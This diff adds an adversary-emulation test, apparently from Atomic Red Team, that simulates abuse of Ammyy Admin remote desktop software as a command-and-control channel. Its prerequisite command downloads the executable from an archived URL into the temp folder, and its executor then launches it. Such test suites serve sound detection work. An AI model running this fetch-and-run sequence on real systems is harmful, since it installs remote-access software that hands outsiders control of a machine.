@@ -87,3 +87,30 @@ atomic_tests:
       msiexec /x $installer /qn
     name: powershell
     elevation_required: true
+- name: Ammyy Admin Software Execution
+  auto_generated_guid: 0ae9e327-3251-465a-a53b-485d4e3f58fa
+  description: |
+    An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. 
+    Upon successful execution, Ammyy Admin will be executed. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    Ammyy_Admin_Path:
+      description: Path of Ammyy Admin executable
+      type: Path
+      default: $env:temp\ammyy.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Ammyy Admin must exist on disk at the specified location (#{Ammyy_Admin_Path})
+    prereq_command: |
+      if (Test-Path #{Ammyy_Admin_Path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Start-BitsTransfer -Source "https://web.archive.org/web/20140625232737/http://www.ammyy.com/AA_v3.exe" -Destination "$env:temp\ammyy.exe" -dynamic
+  executor:
+    command: |
+      Start-Process #{Ammyy_Admin_Path}
+    cleanup_command: | 
+      Stop-Process -Name "Ammyy" -force -erroraction silentlycontinue
+    name: powershell
+    elevation_required: True
